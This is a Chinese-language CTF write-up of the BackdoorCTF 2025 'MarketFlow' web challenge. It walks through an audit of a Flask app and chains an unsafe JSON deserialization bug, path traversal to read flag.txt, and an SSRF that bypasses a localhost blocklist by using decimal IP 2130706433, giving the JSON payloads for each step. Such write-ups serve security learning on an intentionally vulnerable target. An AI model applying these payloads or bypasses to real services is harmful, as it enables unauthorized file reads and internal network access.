---
title: BackdoorCTF 2025 - MarketFlow
description: 做完这道题感觉浑身舒畅
author: lamaper
date: 2025-12-08 17:13:21 +0800
categories: [Cyber Security]
tags: [ctf, python, SSRF, deserialize]
math: true
mermaid: true
toc: true
render_with_liquid: true
image:
  path: https://infoseciitr.in/logo.png
---

# MarketFlow

## 解题过程

首先查看`app.py`：

```python
from flask import Flask, request, jsonify, session, send_file, render_template

...

@app.route('/api/campaigns', methods=['POST'])
@login_required
def create_campaign():
    data = request.json
    user_id = session['user_id']
    
    campaign_obj = object_manager.deserialize(data)
...
```

发现这里存在一个`deserialize(data)`，我们应当对反序列化这种词汇高度敏感，于是看看上下文，发现这个`data`来自于`data = request.json`，也就是说`data`是JSON类型。然后去看看`object_manager.deserialize()`的实现：

```python
class ObjectManager:
    def __init__(self):
        self.registry = CLASS_REGISTRY
    
    def deserialize(self, data):
        if not isinstance(data, dict):
            return data
        
        obj_type = data.get('_type')
        
        if not obj_type:
            return data
        
        if obj_type not in self.registry:
            raise ValueError(f"Unknown type: {obj_type}")
        
        klass = self.registry[obj_type]
        
        if not hasattr(klass, 'schema_version'):
            raise ValueError(f"Invalid class: {obj_type}")
        
        if not getattr(klass, 'serializable', False):
            raise ValueError(f"Type not serializable: {obj_type}")
        
        constructor_data = {k: v for k, v in data.items() if k != '_type'}
        
        instance = klass(**constructor_data)
        
        for key, value in data.items():
            if isinstance(value, dict) and '_type' in value:
                nested = self.deserialize(value)
                setattr(instance, key, nested)
        
        return instance
    
    def serialize(self, obj):
        if hasattr(obj, 'to_dict'):
            return obj.to_dict()
        return str(obj)
```

检查这个代码逻辑，首先，如果不是字典类型，就直接返回原数据。接着，要看字典是否含有键值对`_type`，这个`_type`必须要在`CLASS_REGISTRY`中，然后这个函数获取了`_type`的类型，检查这个类型是否可序列化，之后清除`_type`这个键值对。关键的地方是`instance = klass(**constructor_data)`，这个反序列化函数在这里创建了一个动态对象，其参数就是刚刚清除了`_type`的字典。之后就是递归反序列化，如果参数有字典，字典含有`_type`就继续反序列化。

接着向上看，找到：

```python
CLASS_REGISTRY = {
    'User': User,
    'UserPreferences': UserPreferences,
    'Campaign': Campaign,
    'CampaignSchedule': CampaignSchedule,
    'TargetAudience': TargetAudience,
    'Analytics': Analytics,
    'ReportConfiguration': ReportConfiguration,
    'MetricAggregator': MetricAggregator,
    'AnalyticsProcessor': AnalyticsProcessor,
    'Content': Content,
    'ContentMetadata': ContentMetadata,
    'TemplateSpecification': TemplateSpecification,
    'WebhookForwarder': WebhookForwarder,
    'CacheConfiguration': CacheConfiguration, 
    'PersistenceAdapter': PersistenceAdapter 
}
```

这就是所有支持反序列化函数的类型（但不一定能被反序列化，最重要的是其参数）。

按照这个思路，我们肯定希望利用反序列化的特性，看看有没有可利用的类。这里面很多类都是常规的数据类，没有特殊的操作，有几个类值得关注：

```python
class ReportConfiguration:
    schema_version = "1.0"
    serializable = True
    
    def __init__(self, report_type, date_range, metrics=None, dimensions=None, processor=None, **kwargs):
        self.report_type = report_type
        self.date_range = date_range
        self.metrics = metrics or []
        self.dimensions = dimensions or []
        self.processor = processor
        self.output_format = kwargs.get('output_format', 'json')
        self.template = kwargs.get('template')
        
        if isinstance(self.processor, dict) and '_type' in self.processor:
            from services.object_manager import ObjectManager
            manager = ObjectManager()
            self.processor = manager.deserialize(self.processor)
    
    def to_dict(self):
        return {
            'report_type': self.report_type,
            'date_range': self.date_range,
            'metrics': self.metrics,
            'dimensions': self.dimensions
        }
        
class AnalyticsProcessor:
    schema_version = "1.0"
    serializable = True
    
    def __init__(self, data_source, aggregation_rules=None, output_config=None, **kwargs):
        self.data_source = data_source
        self.aggregation_rules = aggregation_rules or []
        self.output_config = output_config
        self.options = kwargs
        
        if isinstance(self.output_config, dict) and '_type' in self.output_config:
            from services.object_manager import ObjectManager
            manager = ObjectManager()
            self.output_config = manager.deserialize(self.output_config)
    
    def to_dict(self):
        return {
            'data_source': self.data_source,
            'aggregation_rules': self.aggregation_rules
        }
```

`ReportConfiguration`和`AnalyticsProcessor`在自己初始化的时候可以反序列化自己的`self.processor`。

反序列化暂时看不出什么名堂了，我们继续看`app.py`。

```python

@app.route('/api/analytics/reports', methods=['POST'])
@login_required
def generate_report():
    data = request.json
    user_id = session['user_id']
    
    report_config = object_manager.deserialize(data)
    
    report_id = secrets.token_hex(16)
    report_token = secrets.token_urlsafe(32)
    
    scheduler.schedule_task({
        'task_type': 'generate_report',
        'report_id': report_id,
        'report_token': report_token,
        'user_id': user_id,
        'config': data
    })
    
    return jsonify({
        "report_id": report_id,
        "status": "scheduled",
        "report_url": f"/reports/{report_token}.html"
    })
```

这个函数很特殊，因为除了它没有任何函数中在反序列化以后调用`scheduler`，去看看源码了解下这个类在干什么：

```python
class Scheduler:
    def __init__(self):
        pass
    
    def schedule_task(self, task_data):
        db = get_db()
        task_id = secrets.token_hex(16)
        
        db.execute(
            "INSERT INTO scheduled_tasks (id, task_type, task_data, status) VALUES (?, ?, ?, ?)",
            [task_id, task_data.get('task_type'), json.dumps(task_data), 'pending']
        )
        db.commit()
        
        return task_id
```

我们看到这个`Scheduler`可以把`task_data`存到数据库中，这意味这我们的payload如果用/api/analytics/reports传入，可以在数据库中持久化存在。接着往下看：

```python
                if task_type == 'generate_report':
                    config_data = task_data.get('config', {})
                    config_obj = manager.deserialize(config_data)
                    report_token = task_data.get('report_token', secrets.token_urlsafe(32))

                    if isinstance(config_obj, ReportConfiguration):
                        if hasattr(config_obj, 'processor') and config_obj.processor:
                            processor = config_obj.processor
                            
                            if hasattr(processor, 'output_config') and processor.output_config:
                                output_cfg = processor.output_config
                                
                                if isinstance(output_cfg, CacheConfiguration):
                                    cache_service.prime(output_cfg)

                    if hasattr(config_obj, 'template') and config_obj.template:
                        template_spec = config_obj.template
                        if isinstance(template_spec, dict) and '_type' in template_spec:
                            template_spec = manager.deserialize(template_spec)
                        
                        if hasattr(template_spec, 'template_name'):
                            output = renderer.render(template_spec)
```

发现`config_obj`也是被反序列化来的对象。又发现有`render`方法，这个方法可以用来读文件，也就是说可以用它去看flag，看看源码：

```python
    def render(self, template_spec):
        if not hasattr(template_spec, 'template_name'):
            raise ValueError("Template specification missing template_name")
        
        template_path = os.path.join(self.template_dir, template_spec.template_name)
        
        if template_path.endswith('.tpl'):
            return self._render_legacy_template(template_path, template_spec)
        else:
            return self._render_safe_template(template_path, template_spec)
    
    def _render_safe_template(self, template_path, spec):
        with open(template_path, 'r') as f:
            template_content = f.read()
        
        variables = getattr(spec, 'variables', {})
        
        for key, value in variables.items():
            placeholder = f"{{{{{key}}}}}"
            template_content = template_content.replace(placeholder, str(value))
        
        return template_content
```

发现这里读数据用的是` os.path.join(self.template_dir, template_spec.template_name)`，众所周知，`os.path.join()`不安全，如果有绝对路径存在，就会忽略别的参数，我们在这如果构造路径穿越理论上就可以访问任何地方的文件。

那么接下来的思路就是如何构造payload来读取文件。很显然，`config_data`必须有属性`template`，那么就只有`ReportConfiguration`能满足这个操作了。所以可以借由/api/analytics/reports构造payload，首先可以写出data：

```json
{
    "_type": "ReportConfiguration",
    "report_type": "114",
    "date_range": "514",
    "template": {
       
    }
}
```

由于沟槽的python不会显式声明属性的类型，根据类型推断我们知道，`config_obj.template`的类型是`TemplateRenderer`，所以我们可以接着写：

```python
{
    "_type": "ReportConfiguration",
    "report_type": "114",
    "date_range": "514",
    "template": {
        "_type": "TemplateSpecification",
        "template_name": "../../../../flag.txt",
        "output_path": "stolen.txt"
    }
}
```

那么这样一个payload就被构造好了。

但是光传上去没有什么用，必须要让payload执行，我们接着在`ap.py`中找有没有调用`Scheduler`的函数，发现：

```python
@app.route('/internal/cron/process', methods=['POST'])
def process_scheduled_tasks():
    if request.remote_addr not in ['127.0.0.1', 'localhost']:
        return jsonify({"error": "Internal only"}), 403
    
    try:
        scheduler.process_pending()
    except Exception as e:
        return jsonify({"error": str(e)}), 403
    
    return jsonify({"status": "processed"})
```

这里有`scheduler.process_pending()`就能让我们的payload真正加载。但是出现了一个问题，它不允许外部访问，也就是说我们需要找到SSRF让他跨站请求。恰好这个函数下面就是：

```python
@app.route('/api/webhooks/forward', methods=['POST'])
@login_required
def forward_webhook():
    from services.webhook_service import WebhookForwarder
    
    data = request.json
    forwarder_obj = object_manager.deserialize(data)
    
    if not isinstance(forwarder_obj, WebhookForwarder):
        return jsonify({"error": "Invalid forwarder configuration"}), 400
    
    payload = data.get('payload', {})
    result = forwarder_obj.forward(payload)
    
    return jsonify(result)
```

这里有反序列化，意味着我们也可以像上面一样构成payload，又发现了forward，这个词令人遐想连篇，赶紧看看`WebhookForwarder`：

```python
class WebhookForwarder:
    schema_version = "1.0"
    serializable = True
    
    def __init__(self, target_url, method='POST', headers=None, **kwargs):
        self.target_url = target_url
        self.method = method.upper()
        self.headers = headers or {}
        self.options = kwargs
    
    def forward(self, data):
        if not is_safe_url(self.target_url):
            raise ValueError("URL not allowed: localhost or private IP detected")
        
        try:
            if self.method == 'GET':
                response = requests.get(
                    self.target_url,
                    headers=self.headers,
                    timeout=5
                )
            else:
                response = requests.post(
                    self.target_url,
                    json=data,
                    headers=self.headers,
                    timeout=5
                )
            
            return {
                'status_code': response.status_code,
                'body': response.text[:1000]
            }
        except Exception as e:
            return {
                'error': str(e)
            }
    
    def to_dict(self):
        return {
            'target_url': self.target_url,
            'method': self.method
        }
```

这就非常妙了，通过反序列化漏洞构造一个`WebhookForwarder`对象，让其请求/internal/cron/process，这样就是本机IP了：

```json
{
    "_type": "WebhookForwarder",
    "target_url": f"http://{LOCAL_IP_DECIMAL}:5000/internal/cron/process",
    "method": "POST"
}
```

这里不知道LOCAL_IP_DECIMAL应该怎么写，因为：

```python
def is_safe_url(url):
    parsed = urlparse(url)
    host = parsed.hostname
    
    if not host:
        return False
    
    localhost_patterns = [
        r'^localhost$',
        r'^127\.',
        r'^0\.0\.0\.0$',
        r'^::1$',
        r'^::$',
        r'^0:0:0:0:0:0:0:1$'
    ]
    
    for pattern in localhost_patterns:
        if re.match(pattern, host, re.IGNORECASE):
            return False
    
    private_ranges = [
        r'^10\.',
        r'^172\.(1[6-9]|2[0-9]|3[01])\.',
        r'^192\.168\.',
        r'^169\.254\.',
        r'^fc00:',
        r'^fe80:'
    ]
    
    for pattern in private_ranges:
        if re.match(pattern, host, re.IGNORECASE):
            return False
    
    return True
```

这个函数几乎禁用了所有本地IP地址，我们应该怎么构造呢？

这里采用`LOCAL_IP_DECIMAL = "2130706433" # 127.0.0.1`，也就是十进制的IP。 Python 的 requests 库，以及底层的 socket 库会自动将这个数字解析为 127.0.0.1。这样就实现了绕过。

所以我们直接POST这个

```json
{
    "_type": "WebhookForwarder",
    "target_url": f"http://2130706433:5000/internal/cron/process",
    "method": "POST"
}
```

然后访问/report/stolen.txt即可。

## 回顾与反思

这个题堪称OWASP TOP10的集小成之作，有SSRF、反序列化，还有一些waf绕过的小技巧，很考察代码审计能力和敏感度。

私以为真正的CTF题目也就应如此，不是刻意地以一些简单的场景+复杂的waf去搞做题式payload构造，而是在真实的场景中去发现各种漏洞。

感觉这个题真的很不错。